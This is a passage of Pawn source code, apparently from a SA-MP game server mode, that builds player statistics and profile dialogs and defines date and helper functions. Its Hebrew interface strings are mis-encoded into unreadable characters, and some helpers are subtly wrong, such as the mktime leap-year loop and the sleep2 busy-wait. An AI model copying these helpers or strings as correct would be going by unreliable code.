	else if(equal(upd,"hide"))
	{
		for(new i = 0; i < sizeof(StatsFields); i++)
		{
			TextDrawHideForPlayer(playerid,StatsFields[i][sfTD][0]);
			TextDrawHideForPlayer(playerid,StatsFields[i][sfTD][1]);
		}
		playerinfo[playerid][showstats] = INVALID_PLAYER_ID;
		CancelSelectTextDraw(playerid);
	}
	else if(equal(upd,"select")) ShowStatsPart(playerid,playerinfo[playerid][showstats],param);
	return 1;
}
//=[ShowStatsPart]==============================================================
stock ShowStatsPart(playerid,id,part)
{
	new header[64], string[800], c = 0, Float:h, Float:a;
	#pragma tabsize 0
	DialogCreate(8);
	switch(part)
	{
		case statsfield_stats:
		{
			header = "фёшршё ∙ь";
			GetPlayerHealth(id,h);
			GetPlayerArmour(id,a);
			if(strlen(playerinfo[id][slevelname]) > 1) format(string,sizeof(string),playerinfo[id][slevelname]);
			else format(string,sizeof(string),levels[playerinfo[id][level]][LevelName]);
			format(string,sizeof(string),@c(grey) "╗ [" @c(white) "%s" @c(grey) "] °ю· ю∙·ю∙: " @c(white) "%d\n",string,playerinfo[id][level]);
			DialogFormat(string);
			format(string,sizeof(string),@c(grey) "╗ ф°щтх·: " @c(white) "%d" @c(grey) " Х ф°щтх· ьЄьщщ· °юф: " @c(white) "%d" @c(grey) " Х ∙щр схЁхё: " @c(white) "%d" @c(grey) " Х фу-∙хшщэ: " @c(white) "%d" @c(grey) " Х шсьрх·: " @c(white) "%d" @c(grey) " Х ёщсрт: " @c(white) "%.2f\n",
			playerinfo[id][kills],playerinfo[id][level] < sizeof(levels)-1? ((levels[playerinfo[id][level]+1][NeedKills]-playerinfo[id][kills]) < 0 ? 0 : (levels[playerinfo[id][level]+1][NeedKills]-playerinfo[id][kills])):(0),playerinfo[id][bonus_si],playerinfo[id][hshots],playerinfo[id][tables],playerinfo[id][bestcbug]);
			DialogFormat(string);
			if(playerinfo[id][upower] >= 0 || playerinfo[id][upower2] >= 0)
			{
				if(playerid == id) format(string,sizeof(string),@c(grey) "╗ рЁ°тщф: " @c(white) "%d" @c(grey) " Х ютсь· рЁ°тщф: " @c(white) "%d",playerinfo[id][energy],levels[playerinfo[id][level]][EnergyLimit]);
				else format(string,sizeof(string),@c(grey) "╗ ютсь· рЁ°тщф: " @c(white) "%d",levels[playerinfo[id][level]][EnergyLimit]);
				if(playerinfo[id][upower] >= 0) format(string,sizeof(string),"%s" @c(grey) " Х Ultimate Power: " @c(white) "%s",string,UltimatePowers[playerinfo[id][upower]][upTitle]);
				if(playerinfo[id][upower2] >= 0) format(string,sizeof(string),"%s" @c(grey) " Х #2 Ultimate Power: " @c(white) "%s",string,UltimatePowers[playerinfo[id][upower2]][upTitle]);
				format(string,sizeof(string),"%s\n",string);
				DialogFormat(string);
			}
			format(string,sizeof(string),@c(grey) "╗ чщщэ: " @c(white) "%d %s" @c(grey) " Х ютя: " @c(white) "%d %s" @c(grey) " Х ыёє Єь °р∙х: " @c(white) "%d" @c(grey) " Х цюя ю∙чў: " @c(white) "%02d:%02d:%02d\n",floatround(h),"%",floatround(a),"%",playerinfo[id][hitman],playerinfo[id][intime][1]/60,playerinfo[id][intime][1],playerinfo[id][intime][0]);
			DialogFormat(string);
			if(playerinfo[id][logged])
			{
				format(string,sizeof(string),@c(grey) "╗ (·р°щъ ф°∙юф: " @c(white) "%s" @c(grey) " Х щющэ ∙Єс°х юрц фф°∙юф: " @c(white) "%d" @c(grey) " (" @c(white) "%d" @c(grey) " ∙Ёщэ\n",playerinfo[id][rdate],Seniority(id),Seniority(id)/365);
				DialogFormat(string);
			}
			format(string,sizeof(string),@c(grey) "╗ чщф: " @c(white) "%s" @c(grey) " Х ёющэ: " @c(white) "%d" @c(grey) " Х уюх·: " @c(white) "%d" @c(grey) " Х ыёє: " @c(white) "$%d" @c(grey) " Х °ю· юсхў∙х·: " @c(white) "%d\n",Pets[playerinfo[id][pet]][petHebName],playerinfo[id][drugs],GetPlayerSkin(id),GetMoney(id),playerinfo[id][wantedlevel]);
			DialogFormat(string);
			if(!playerinfo[id][bomb]) string = "None";
			else format(string,sizeof(string),bombinfo[playerinfo[id][bomb]][bName]);
			format(string,sizeof(string),@c(grey) "╗ ф°щтх· сЇЎЎф: " @c(white) "%d" @c(grey) " Х ЇтщЄх· сЇЎЎф: " @c(white) "%d" @c(grey) " Х " @c(white) "%s" @c(grey) " :ЇЎЎф\n",playerinfo[id][bombkills],playerinfo[id][bombdmg],string);
			DialogFormat(string);
			if(playerinfo[id][clan] > 0)
			{
				format(string,sizeof(string),"{%s}%s" @c(grey),ClanHexColor(playerinfo[id][clan]),claninfo[playerinfo[id][clan]][cname]);
				format(string,sizeof(string),@c(grey) "╗ " @c(white) "/cstats %s" @c(grey) " :°юф сўьря: " @c(white) "%d" @c(grey) " Х ющуЄ Єь фўьря Х %s :ўьря\n",claninfo[playerinfo[id][clan]][cname],playerinfo[id][lclan],string);
				DialogFormat(string);
			}
			if(playerinfo[id][org] > 0)
			{
				format(string,sizeof(string),@c(grey) "╗ °юф ср°тхя: " @c(white) "%d" @c(grey) " Х " @c(white) "%s" @c(grey) " :р°тхя\n",playerinfo[id][lorg],orginfo[playerinfo[id][org]][oname]);
				DialogFormat(string);
			}
			if(playerid == id) DialogString(@c(grey) "╗ /SecretWord :ыущ ь°рх· р· фўху фрщ∙щ ∙ьъ ф∙·ю∙ сЇўхуф\n");
		}
		case statsfield_profile:
		{
			header = "фЇ°хЇщь ∙ь";
			if(!equal(playerinfo[id][rname],"None") && !equal(playerinfo[id][rname],"no") && strlen(playerinfo[id][rname]) > 0)
			{
				format(string,sizeof(string),@c(white) "╗ ∙э Ї°шщ: %s\n",playerinfo[id][rname]), c++;
				DialogFormat(string);
			}
			if(!equal(playerinfo[id][country],"None") && !equal(playerinfo[id][country],"no"))
			{
				format(string,sizeof(string),@c(white) "╗ юўхэ ютх°щэ: %s\n",playerinfo[id][country]), c++;
				DialogFormat(string);
			}
			if(playerinfo[id][birthdate][0] != 0 || playerinfo[id][birthdate][1] != 0 || playerinfo[id][birthdate][2] != 0)
			{
				new y[2];
				getdate(y[0],y[1],y[1]);
				format(string,sizeof(string),@c(white) "╗ тщь: %d",y[0]-playerinfo[id][birthdate][2]);
				format(string,sizeof(string),"%s\n\n" @c(white) "╗ ·р°щъ ьщуф: %02d/%02d/%04d\n",string,playerinfo[id][birthdate][0],playerinfo[id][birthdate][1],playerinfo[id][birthdate][2]);
				DialogFormat(string);
				c++;
			}
			if(playerinfo[id][icq] > 0)
			{
				format(string,sizeof(string),@c(white) "╗ {02FF00}IC{FC0A18}Q" @c(white) ": %d\n",playerinfo[id][icq]), c++;
				DialogFormat(string);
			}
			/*if(!equal(playerinfo[id][messenger],"None") && !equal(playerinfo[id][messenger],"no"))
			{
				format(string,sizeof(string),@c(white) "╗ {78BAE3}Messe{74BD63}nger" @c(white) ": %s\n",playerinfo[id][messenger]), c++;
				DialogFormat(string);
			}
			if(!equal(playerinfo[id][skype],"None") && !equal(playerinfo[id][skype],"no"))
			{
				format(string,sizeof(string),@c(white) "╗ {00AFF0}Skype" @c(white) ": %s\n",playerinfo[id][skype]), c++;
				DialogFormat(string);
			}*/
			if(!equal(playerinfo[id][facebook],"None") && !equal(playerinfo[id][facebook],"no"))
			{
				format(string,sizeof(string),@c(white) "╗ {3B5998}Facebook" @c(white) ": %s\n",playerinfo[id][facebook]), c++;
				DialogFormat(string);
			}
			if(!equal(playerinfo[id][email],"None") && !equal(playerinfo[id][email],"no"))
			{
				format(string,sizeof(string),@c(white) "╗ {7F7F7F}Mail" @c(white) ": %s\n",playerinfo[id][email]), c++;
				DialogFormat(string);
			}
			if(playerid == id)
			{
				if(!c) DialogString(@c(darkred) "∙щэ ьс: " @c(red) "фЇ°хЇщь ∙ьъ °щў, ыущ ьюьр рх·х ьчї Єь " @c(lightred) "Є°щыф");
				else if(c < 8) DialogString(@c(darkred) "∙щэ ьс: " @c(red) "ьр ыь Ї°шщ фЇ°хЇщь фрЇ∙°щщэ юхЎтщэ рЎьъ");
			}
			else
			{
				if(!c) DialogString(@c(darkred) "∙щэ ьс: " @c(red) "ю∙·ю∙ цф сч° ∙ьр ьфЎщт р· фЇ°хЇщь ∙ьх рх ∙фхр ьр Є°ъ рх·х Єущщя");
				else if(c < 8) DialogString(@c(darkred) "∙щэ ьс: " @c(red) "фю∙·ю∙ сч° ∙ьр ьфЎщт чьў юфЇ°шщэ рх ∙ьр Є°ъ рх·э Єущщя");
			}
		}
		case statsfield_groups:
		{
			header = "ўсхЎх· фю∙·ю∙", c = 0;
			for(new i = 0; i < MAX_RANKS && !c; i++) if(PlayerHasRank(id,i)) c++;
			if(c > 0)
			{
				c = 0;
				for(new i = 0; i < MAX_RANKS; i++) if(PlayerHasRank(id,i))
				{
					c++;
					format(string,sizeof(string),@c(grey) "%d. " @c(white) "%s" @c(grey) " [Rank #%02d]\n",c,rankname[i],i);
					DialogFormat(string);
				}
			}
			if(!c) DialogString(@c(red) ".ю∙·ю∙ цф ьр ЁюЎр с∙хэ ўсхЎф");
		}
		case statsfield_weapons:
		{
			header = "фЁ∙ўщэ ∙ь", c = 0;
			for(new i = 0; i < 10 && !c; i++) if(playerinfo[id][weapons][i] != 0) c++;
			if(c > 0)
			{
				c = 0;
				for(new i = 0; i < 10; i++) if(playerinfo[id][weapons][i] > 0 && playerinfo[id][weapons][i] < 40)
				{
					c++;
					format(string,sizeof(string),@c(grey) "%d. %s%s" @c(grey) " - " @c(white) "%d" @c(grey) " (ф°щтх·: " @c(white) "%d" @c(grey) ")\n",c,GetWeaponAmmunationColor(GetWeaponSlot(playerinfo[id][weapons][i]),0),WeaponName(playerinfo[id][weapons][i]),i >= 8 ? 0 : playerinfo[id][ammo][i],playerinfo[id][wkills][playerinfo[id][weapons][i]]);
					DialogFormat(string);
				}
			}
			if(!c) DialogString(@c(red) ".рщя Ё∙ўщэ ·ющущщэ ью∙·ю∙ цф");
			for(new i = 0; i < sizeof(AmmunationSpecialItems); i++) if(playerinfo[id][ammuitems][AmmunationSpecialItems[i][aiID]])
			{
				format(string,sizeof(string),@c(grey) "* [" @c(white) "%s" @c(grey) " %d]\n",AmmunationSpecialItems[i][aiName],playerinfo[id][ammuitemammo][AmmunationSpecialItems[i][aiID]]);
				DialogFormat(string);
			}
		}
		case statsfield_properties:
		{
			header = "фЁыёщэ ссЄьх·";
			for(new i = 0; i < props; i++) if(propinfo[i][pcost] > 0 && propinfo[i][owner] == id)
			{
				c++;
				format(string,sizeof(string),@c(grey) "%d. " @c(white) "%s" @c(grey) " (ючщ°: $%d | ю∙ых°·: $%d | ыюх· ю∙ых°х· ∙Ёх·°х: %d)\n",c,propinfo[i][pname],propper(propinfo[i][pcost]),propper(propinfo[i][pearning]),playerinfo[id][earns][i]);
				DialogFormat(string);
			}
			if(!c) DialogString(@c(red) ".ью∙·ю∙ цф рщя Ёыёщэ ∙°ы∙ ы°тЄ");
			else
			{
				format(string,sizeof(string),@c(green) "\n(юсхёё Єь рчхц фЁыёщэ фЁхычщ - %d%c)",propertyPercent,'%');
				DialogFormat(string);
			}
		}
		case statsfield_vehicles:
		{
			header = "ф°ысщэ ∙ь";
			DialogString(@c(lightred) "°ыс °р∙хя\n" @c(grey) "(юыхЁщ·, рхЇЁхЄ рх рхЇЁщщэ)\n");
			if(playerinfo[id][vehicle][0] > 0)
			{
				format(string,sizeof(string),@c(grey) "╗ " @c(white) "(%d) %s" @c(grey) " :юхуь ф°ыс\n",playerinfo[id][vehicle][0],GetVehicleName(playerinfo[id][vehicle][0]));
				DialogFormat(string);
				if(playerinfo[id][pvcol][0] == -1 && playerinfo[id][pvcol][1] == -1) string = "°тщьщэ";
				else if(playerinfo[id][pvcol][0] > -1 && playerinfo[id][pvcol][1] == -1) valstr(string,playerinfo[id][pvcol][0]);
				else if(playerinfo[id][pvcol][1] > -1 && playerinfo[id][pvcol][0] == -1) valstr(string,playerinfo[id][pvcol][1]);
				else if(playerinfo[id][pvcol][0] > -1 && playerinfo[id][pvcol][1] > -1) format(string,sizeof(string),"%d, %d",playerinfo[id][pvcol][0],playerinfo[id][pvcol][1]);
				format(string,sizeof(string),@c(grey) "╗ ЎсЄщ ф°ыс: " @c(white) "%s\n",string);
				DialogFormat(string);
				for(new i = 0; i < 14; i++) if(playerinfo[id][pvmod][i] > 0) c++;
				format(string,sizeof(string),@c(grey) "╗ ∙щЇх°щ °ыс: " @c(white) "%s\n",c > 0 ? ("щ∙") : ("рщя"));
				DialogFormat(string);
			}
			else DialogString(@c(white) "ью∙·ю∙ цф рщя °ыс °р∙хя");
			DialogString(@c(lightred) "\n°ыс ∙Ёщ\n" @c(grey) "(ёщ°ф, юшхё рх юёхў)\n");
			if(playerinfo[id][vehicle][3] > 0)
			{
				format(string,sizeof(string),@c(grey) "╗ " @c(white) "(%d) %s" @c(grey) " :юхуь ф°ыс\n",playerinfo[id][vehicle][3],GetVehicleName(playerinfo[id][vehicle][3]));
				DialogFormat(string);
				if(playerinfo[id][pvcol2][0] == -1 && playerinfo[id][pvcol2][1] == -1) string = "°тщьщэ";
				else if(playerinfo[id][pvcol2][0] > -1 && playerinfo[id][pvcol2][1] == -1) valstr(string,playerinfo[id][pvcol2][0]);
				else if(playerinfo[id][pvcol2][1] > -1 && playerinfo[id][pvcol2][0] == -1) valstr(string,playerinfo[id][pvcol2][1]);
				else if(playerinfo[id][pvcol2][0] > -1 && playerinfo[id][pvcol2][1] > -1) format(string,sizeof(string),"%d, %d",playerinfo[id][pvcol2][0],playerinfo[id][pvcol2][1]);
				format(string,sizeof(string),@c(grey) "╗ ЎсЄщ ф°ыс: " @c(white) "%s\n",string);
				DialogFormat(string);
			}
			else DialogString(@c(red) ".ью∙·ю∙ цф рщя °ыс ∙Ёщ");
			DialogString(@c(lightred) "\n°ыс ∙ьщ∙щ\n" @c(grey) "(°ыс ющхчу)\n");
			if(playerinfo[id][vehicle][5] > 0)
			{
				new stv = -1;
				for(new i = 0; i < sizeof(SpecialThirdVehicle) && stv == -1; i++) if(playerinfo[id][vehicle][5] == SpecialThirdVehicle[i][stvModel]) stv = i;
				if(stv != -1)
				{
					format(string,sizeof(string),@c(grey) "╗ " @c(white) "(" @c(grey) " юхуь ф°ыс: " @c(white) "%s (%d\n",SpecialThirdVehicle[stv][stvModel],playerinfo[id][vehicle][3]);
					DialogFormat(string);
				}
			}
			else DialogString(@c(red) ".ью∙·ю∙ цф рщя °ыс ∙ьщ∙щ");
		}
		case statsfield_objectives:
		{
			header = "фр·т°щэ ∙фх∙ьюх Є\"щ";
			for(new i = 0; i < MAX_OBJECTIVES; i++)
			{
				format(string,sizeof(string),"{%s}%02d) %s\t%s",HexStringOfColor(playerinfo[id][objective][i] ? lightgreen : lightred),i+1,playerinfo[id][objective][i] ? ("[V]") : (""),Objectives[i][obName]);
				DialogFormat(string);
				if(playerinfo[id][objective][i]) c++;
			}
			format(string,sizeof(string),"\n\n" @c(orange) "Progress: " @c(lightyellow) "%d / %d",c,MAX_OBJECTIVES/*,(MAX_OBJECTIVES * 100) / c*/);
			DialogFormat(string);
			if(id == playerid) DialogString("\n" @c(grey) "/Objectives :°хЎф ьуЄ· рщъ ьф∙ьщэ р· фю∙щюх·? ф∙·ю∙ сЇўхуф");
		}
		case statsfield_activities:
		{
			header = "фЇЄщьхщх· ∙ЁщЎч";
			DialogString(@c(lightred) "ЇЄщьхщх· ыььщх·\n" @c(grey));
			c = 0;
			for(new i = 0; i < sizeof(ActivityIDs); i++) if(!ActivityIDs[i][aidIsCategory])
			{
				c++;
				format(string,sizeof(string),"%s%s%s - " @c(white) "%d" @c(grey),string,!strlen(string) ? ("") : (" Х "),ActivityIDs[i][aidName],act_GetWins(id,act_Code(i)));
				if(c % 3 == 0 || i == sizeof(ActivityIDs)-1)
				{
					DialogFormat(string);
					string = "";
				}
			}
			if(strlen(string) > 0) DialogFormat(string);
			for(new i = 0; i < sizeof(ActivityIDs); i++) if(ActivityIDs[i][aidIsCategory])
			{
				format(string,sizeof(string),@c(lightred) "\n%s\n" @c(grey),ActivityIDs[i][aidName]);
				DialogFormat(string);
				c = 0, string = "";
				for(new j = 0, m = act_GetCategoryMax(i); j < m; j++)
				{
					c++;
					format(string,sizeof(string),"%s%s%s - " @c(white) "%d" @c(grey),string,!strlen(string) ? ("") : (" Х "),act_GetCategoryIndex(i,j),act_GetWins(id,act_Code(i,j)));
					if(c % 3 == 0 || j == m-1)
					{
						DialogFormat(string);
						string = "";
					}
				}
			}
		}
	}
	if(PlayerDefinedName(id)) format(header,sizeof(header),@c(lightred) ":%s %s %s",GetName(id),header,playerinfo[id][rname]);
	else format(header,sizeof(header),@c(lightred) ":%s %s",GetName(id),header);
	format(string,sizeof(string),"\n\n" @c(lightyellow) "[юЄхуыя ь: %s %s]",GetDateAsString(),GetTimeAsString(true));
	DialogFormat(string);
	DialogSend(playerid,part == statsfield_profile && id == playerid ? dialog_profile : dialog_showstats,DIALOG_STYLE_MSGBOX,header,part == statsfield_profile && id == playerid ? ("Є°щыф") : ("ётх°"),part == statsfield_profile && id == playerid ? ("ётх°") : (""));
	playerinfo[playerid][clickon] = id;
	#pragma tabsize 4
	return 1;
}
//=[ShowStats_OLD]==============================================================
stock ShowStats_OLD(playerid,id)
{
	new string[M_S], Float:h, Float:a, weaps = 0, regdate[M_S], levelname[32];
	format(string,sizeof(string),id == playerid ? (" ~~~ :%s - фёшшщёшщўх· ∙ьъ ~~~") : (" ~~~ :%s фёшшщёшщўх· ∙ь ~~~"),GetName(id));
	SendClientMessage(playerid,lightblue,string);
	for(new i=0;i<10;i++) if(playerinfo[id][weapons][i] != 0) weaps++;
	GetPlayerHealth(id,h);
	GetPlayerArmour(id,a);
	format(regdate,sizeof(regdate),playerinfo[id][rdate]);
	if(strlen(playerinfo[id][slevelname]) > 1) format(levelname,sizeof(levelname),playerinfo[id][slevelname]);
	else format(levelname,sizeof(levelname),levels[playerinfo[id][level]][LevelName]);
	format(string,sizeof(string)," [%s] °юф - %d",levelname,playerinfo[id][level]);
	SendClientMessage(playerid,grey,string);
	new morelvl = playerinfo[id][level] < sizeof(levels)-1? (levels[playerinfo[id][level]+1][NeedKills]-playerinfo[id][kills]):(0);
	format(string,sizeof(string)," шсьрх·: %d | фу-∙хшщэ: %d | юёЇ° фф°щтх· фу°х∙х· ьЄьщщ· °юф: %d | ∙щр схЁхё: %d | ф°щтх·: %d",playerinfo[id][tables],playerinfo[id][hshots],morelvl < 0 ? 0 : morelvl,playerinfo[id][bonus_si],playerinfo[id][kills]);
	SendClientMessage(playerid,grey,string);
	format(string,sizeof(string)," чщщэ: %d %% | ютя: %d %% | ыюх· Ё∙ўщэ: %d | ыёє Єь °р∙х: %d$ | цюя ю∙чў: %02d:%02d:%02d",floatround(h),floatround(a),weaps,playerinfo[id][hitman],playerinfo[id][intime][1]/60,playerinfo[id][intime][1]%60,playerinfo[id][intime][0]);
	SendClientMessage(playerid,grey,string);
	if(Seniority(id)/365 > 0) format(string,sizeof(string)," Ё°∙э ь∙°· с: %s | щющэ ∙Єс°х юрц фф°∙юф: %d (%d ∙Ёщэ с∙°·) | °ю· хх·ў: %d",playerinfo[id][logged]? (regdate) : ("ю∙·ю∙ ьр °∙хэ"),Seniority(id),Seniority(id)/365,Seniority(id)/10);
	else format(string,sizeof(string)," Ё°∙э ь∙°· с: %s | щющэ ∙Єс°х юрц фф°∙юф: %d | °ю· хх·ў: %d",playerinfo[id][logged]? (regdate) : ("ю∙·ю∙ ьр °∙хэ"),Seniority(id),Seniority(id)/10);
	SendClientMessage(playerid,grey,string);
	format(string,sizeof(string)," чщф: %s | ёющэ: %d | уюх·: %d",Pets[playerinfo[playerid][pet]][petName],playerinfo[id][drugs],GetPlayerSkin(id));
	SendClientMessage(playerid,grey,string);
	format(string,sizeof(string),bombinfo[playerinfo[id][bomb]][bName]);
	format(string,sizeof(string)," ф°щтх· сЇЎЎф: %d | ЇтщЄх· сЇЎЎф: %d | %s :ЇЎЎф",playerinfo[id][bombkills],playerinfo[id][bombdmg],!playerinfo[id][bomb] ? ("None") : (string));
	SendClientMessage(playerid,grey,string);
	format(string,sizeof(string)," °ю· ю∙·ю∙ ысху: %d | °ю· ысху: %d | °ю· юсхў∙х·: %d",playerinfo[id][vip],playerinfo[id][logged] ? GetRespect(id) : 0,playerinfo[id][wantedlevel]);
	SendClientMessage(playerid,grey,string);
	if(!playerinfo[id][clan] || !claninfo[playerinfo[id][clan]][cvalid]) format(string,sizeof(string)," None :ўьря");
	else format(string,sizeof(string)," (/clan info details %s) %s :ўьря",claninfo[playerinfo[id][clan]][cname],claninfo[playerinfo[id][clan]][cname]);
	format(string,sizeof(string)," /showprofile(sp) %d :Ї°шщэ рщ∙щщэ | /pranks %d :ўсхЎх· ∙фю∙·ю∙ ∙щщъ рьщфя",id,id);
	SendClientMessage(playerid,orange,string);
	return 1;
}
//=[ShowStats]==================================================================
stock ShowStats(playerid,id)
{
	switch(playerinfo[playerid][setting][setting_stats])
	{
		case 1: return UpdateStatsFields(playerid,"show",id);
		case 2: return ShowStats_OLD(playerid,id);
		case 3:
		{
			new string[128];
			if(id == playerid) SendClientMessage(playerid,orange," - Your Stats: -");
			else
			{
				format(string,sizeof(string)," - %s's Stats: -",GetName(id));
				SendClientMessage(playerid,orange,string);
			}
			format(string,sizeof(string),@c(red) "Kills: %d " @c(lightred) "Level: %d " @c(blue) "HeadShots: %d " @c(lightblue) "Playing Time: %02d:%02d:%02d",playerinfo[id][kills],playerinfo[id][level],playerinfo[id][hshots],playerinfo[id][intime][1]/60,playerinfo[id][intime][1],playerinfo[id][intime][0]);
			SendClientMessage(playerid,orange,string);
		}
	}
	return 1;
}
//=[FloatToInt]=================================================================
stock FloatToInt(Float:flo)
{
	new string[M_S], delpos = 0;
	format(string,sizeof(string),"%f",flo);
	for(new i=0;i<strlen(string);i++) if(string[i] == '.') delpos = i;
	strdel(string,delpos,strlen(string));
	return strval(string);
}
//=[SetPlayerHealth2]===========================================================
#undef SetPlayerHealth
stock SetPlayerHealth2(playerid,Float:health)
{
	if(health == 0.0) playerinfo[playerid][usedkill] = 1;
	playerinfo[playerid][phealth] = health;
	playerinfo[playerid][dontac] = 3;
	SetPlayerHealth(playerid,health);
	return 1;
}
#define SetPlayerHealth SetPlayerHealth2
//=[SetPlayerArmour2]===========================================================
#undef SetPlayerArmour
stock SetPlayerArmour2(playerid,Float:aaarmour)
{
	playerinfo[playerid][parmour] = aaarmour;
	playerinfo[playerid][dontac] = 3;
	SetPlayerArmour(playerid,aaarmour);
	return 1;
}
#define SetPlayerArmour SetPlayerArmour2
//=[SpawnPlayer2]===============================================================
#undef SpawnPlayer
stock SpawnPlayer2(playerid)
{
	if(IsPlayerDead(playerid)) return 1;
	SpawnPlayer(playerid);
	TeamDefines(playerid);
	return 1;
}
#define SpawnPlayer SpawnPlayer2
//=[GetEmptyWorld]==============================================================
stock GetEmptyWorld()
{
	new flag = 0;
	for(new i = world_count; i <= max_worlds; i++)
	{
		for(new ii = 0; ii < MAX_PLAYERS_ && !flag; ii++) if(IsPlayerConnected(ii) && GetPlayerVirtualWorld(ii) == i) flag = 1;
		if(flag) flag = 0;
		else return i;
	}
	return -1;
}
//=[GetPlayersInVirtualWorld]===================================================
stock GetPlayersInVirtualWorld(w)
{
	new c = 0;
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && GetPlayerVirtualWorld(i) == w) c++;
	return c;
}
//=[mktime]=====================================================================
stock mktime(hour,minute,second,day,month,year)
{   // by DracoBlue, improved by me
	new days_of_month[12], timestamp = second + (minute * 60) + (hour * 3600), days_this_year = 0;
	if(((year % 4 == 0) && (year % 100 != 0)) || (year % 400 == 0)) days_of_month = {31,29,31,30,31,30,31,31,30,31,30,31};
	else days_of_month = {31,28,31,30,31,30,31,31,30,31,30,31};
	days_this_year = day;
	if(month > 1) for(new i=0; i<month-1;i++) days_this_year += days_of_month[i];
	timestamp += days_this_year * 86400;
	for(new j=1970;j<year;j++) timestamp += ((year % 4 == 0) && (year % 100 != 0)) || (year % 400 == 0)? 31536000+86400:31536000;
	return timestamp;
}
//=[DaysBetweenDates]===========================================================
stock DaysBetweenDates(DateStart[],DateEnd[])
{	// by SharkyKH, improved by me
	new idx1, idx2;
	new Start_Day = strval(strtok(DateStart,idx1,'/'));
	new Start_Month = strval(strtok(DateStart,idx1,'/'));
	new Start_Year = strval(strtok(DateStart,idx1,'/'));
	new End_Day = strval(strtok(DateEnd,idx2,'/'));
	new End_Month = strval(strtok(DateEnd,idx2,'/'));
	new End_Year = strval(strtok(DateEnd,idx2,'/'));
	new init_date = mktime(12,0,0,Start_Day,Start_Month,Start_Year);
	new dest_date = mktime(12,0,0,End_Day,End_Month,End_Year);
	return floatround((dest_date-init_date)/60/60/24,floatround_floor);
}
//=[sleep2]=====================================================================
stock sleep2(seconds)
{   // by Xalphox, improved by me
	assert seconds > 0 && seconds < cellmax;
	new nt[4], ot[4];
	gettime(ot[0],ot[1],ot[2]);
	ot[3] = ot[2] + (ot[1]*60) + (ot[0]*600);
	while(nt[3] != (ot[3]+seconds))
	{
		gettime(nt[0],nt[1],nt[2]);
		nt[3] = nt[2] + (nt[1]*60) + (nt[0]*600);
	}
}
//=[ChangeAccName]==============================================================
stock ChangeAccName(playerid,newname[])
{
	new string[M_S], f[M_S];
	if(!playerinfo[playerid][logged]) return 0;
	format(f,sizeof(f),"/DM/Houses/%d.ini",playerinfo[playerid][house]);
	fsetstring(f,"Owner",newname);
	fsetstring(f,"Acc0",newname);
	UpdateHouseText(playerinfo[playerid][house]);
	for(new i=0;i<houses;i++)
	{
		format(f,sizeof(f),"/DM/Houses/%d.ini",i);
		if(!fexist(f) || playerinfo[playerid][house] == i || (playerinfo[playerid][acctested][i] && !playerinfo[playerid][houseacc][i])) continue;
		for(new ii=1;ii<max_houseacc;ii++)
		{
			format(string,sizeof(string),"Acc%d",i);
			if(!(fkeyexist(f,string) && equal(fgetstring(f,string),newname))) continue;
			fsetstring(f,string,newname);
			break;
		}
	}
	return 1;
}

//=[IsFloat]====================================================================
stock IsFloat(string[])
{
	new dots = 0, dot, num[32];
	for(new i=0;i<strlen(string);i++) if(string[i] == '.') dot = i, dots++;
	if(!dots || dots > 1) return 0;
	strmid(num,string,0,dot-1);
	if(!IsNumeric(num)) return 0;
	strmid(num,string,dot+1,strlen(string));
	return IsNumeric(num);
}
//=[GiveJetpack]================================================================
stock GiveJetpack(playerid)
{
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USEJETPACK);
	if(!playerinfo[playerid][noticedmsg][21])
	{
		SendClientMessage(playerid,grey," (ыущ ьфчьщє ~k~~CONVERSATION_YES~ рх ~k~~CONVERSATION_NO~ ·хыь ььчхї Jetpack-сющуф хщ∙ ьъ юёЇ° Ё∙ўщэ ∙рЇ∙° ьщ°х· рщ·э с)");
		playerinfo[playerid][noticedmsg][21] = 1;
	}
	playerinfo[playerid][jetpack] = 1;
	return 1;
}
//=[GetDay]=====================================================================
stock GetDay(year,month,day,lang)
{
	new string[16];
	string = "Invalid date";
	if(IsValidDate(day,month,year))
	{
		new wkday = weekday(day,month,year);
		switch(wkday)
		{
			case 0: string = !lang? ("Saturday"):("∙с·");
			case 1: string = !lang? ("Sunday"):("°р∙хя");
			case 2: string = !lang? ("Monday"):("∙Ёщ");
			case 3: string = !lang? ("Tuesday"):("∙ьщ∙щ");
			case 4: string = !lang? ("Wednesday"):("°сщЄщ");
			case 5: string = !lang? ("Thursday"):("чющ∙щ");
			case 6: string = !lang? ("Friday"):("∙щ∙щ");
		}
	}
	return string;
}
//=[IsValidDate]================================================================
stock IsValidDate(&day,&month,&year) return month >= 1 && month <= 12 && day >= 1 && day <= GetDaysInMonth(month,year);
//=[GetDaysInMonth]=============================================================
stock GetDaysInMonth(month,year)
{
	new daylist[] = {31,28,31,30,31,30,31,31,30,31,30,31};
	return daylist[month-1] + _:(month == 2 && IsLeapYear(year));
}
//=[IsLeapYear]=================================================================
stock IsLeapYear(year) return year % 400 == 0 || year % 100 != 0 && year % 4 == 0;
//=[weekday]====================================================================
stock weekday(day,month,year)
{
	if(month <= 2) month += 12, --year;
	new j = year % 100, e = year / 100;
	return (day + (month+1)*26/10 + j + j/4 + e/4 - 2*e) % 7;
}
//=[getarg_string]==============================================================
stock getarg_string(argument)
{
	new string[M_S];
	for(new i=0;getarg(argument,i)!='\0';i++) string[i] = getarg(argument,i);
	return string;
}
//=[GetRespect]=================================================================
stock GetRespect(playerid)
{
	new respect = playerinfo[playerid][level]/5 + playerinfo[playerid][vip];
	respect += Seniority(playerid)/50;
	respect += playerinfo[playerid][bank]/1000000;
	respect += playerinfo[playerid][kills]/5000;
	respect += playerinfo[playerid][pet]/2;
	return playerinfo[playerid][clan] > 0 ? ++respect : respect;
}
//=[Seniority]==================================================================
stock Seniority(playerid) return playerinfo[playerid][logged] ? DaysBetweenDates(playerinfo[playerid][rdate],GetDateAsString()) : 0;
//=[WeaponCost]=================================================================
stock WeaponCost(playerid,weaponid)
{
	if(playerinfo[playerid][level] <= 1 || Ammunation[weaponid][aSlot] == 8 || Ammunation[weaponid][aSlot] == 9) return Ammunation[weaponid][aCost];
	new costByLevel = Ammunation[weaponid][aCost] + ((playerinfo[playerid][ammo][Ammunation[weaponid][aSlot]]/**/) * (Ammunation[weaponid][aCost] * 40 / 100));
	if(ammusale[0] == ammusale_half && (ammusale[1] ? (Ammunation[weaponid][aID] == ammusale[2]) : (GetWeaponSlot(Ammunation[weaponid][aID]) == ammusale[2]))) costByLevel /= 2;
	//costByLevel += (costByLevel/3)*playerinfo[playerid][level];
